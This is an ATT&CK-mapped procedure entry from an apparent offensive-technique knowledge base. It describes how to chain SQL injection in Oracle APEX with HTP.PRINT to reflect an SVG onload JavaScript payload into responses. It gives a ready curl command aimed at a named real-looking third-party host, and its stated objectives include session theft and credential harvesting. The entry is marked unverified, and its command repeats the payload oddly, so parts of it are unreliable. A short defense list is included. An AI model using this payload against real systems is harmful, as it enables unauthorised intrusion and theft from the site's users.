---
tags:
  - sqli
  - xss
  - chained-exploit
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/xss-via-sqli-payload]]'
verified: false
platforms:
  - Web
  - Oracle Database
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:25.747Z'
sub_techniques: []
id: 8c4c8412-a6ee-481c-b68f-d70faa2f00c2
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Execute-XSS-via-SQL-Injection-in-Oracle-APEX

## Summary

This procedure chains SQL injection with PL/SQL's HTP.PRINT function to inject and execute arbitrary JavaScript, such as an SVG onload prompt, directly into the HTTP response, enabling cross-site scripting attacks from a server-side vulnerability.

## Description

In the vulnerable Oracle APEX endpoint, the SQLi allows closure of the query and execution of HTP.PRINT(:1), where :1 contains unsanitized HTML/JS like <svg/onload=prompt(...)>. This outputs raw content to the response, bypassing typical XSS filters and executing in the victim's browser for potential session theft or phishing.

## Requirements

1. Active SQLi vector confirmed
2. Burp Suite for payload delivery and response inspection
3. Browser to observe client-side execution

## Defense

Defensive measures and detection strategies:

- Sanitize all outputs from PL/SQL functions like HTP.PRINT
- Implement Content Security Policy (CSP) to block inline scripts
- Scan for reflected payloads in responses using IDS

## Objectives

1. Demonstrate client-side code execution via server vuln
2. Highlight chaining risks in web apps
3. Enable further attacks like credential harvesting

## Instructions

### Step 1: Inject XSS Payload via HTP.PRINT

**Context**: Use the SQLi to print a malicious SVG that triggers JS on load.

**Command** ([[commands/xss-via-sqli-payload]]):
```bash
curl "http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive) <svg/onload=prompt('XSS\u0020via\u0020sql\u0020injection')>" -d ":1=positive) <svg/onload=prompt('XSS via sql injection')>" -v
```

> The payload outputs the SVG directly, causing prompt('XSS via sql injection') to execute in the browser upon rendering.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/xss-via-sqli-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss
- javascript
- oracle-apex
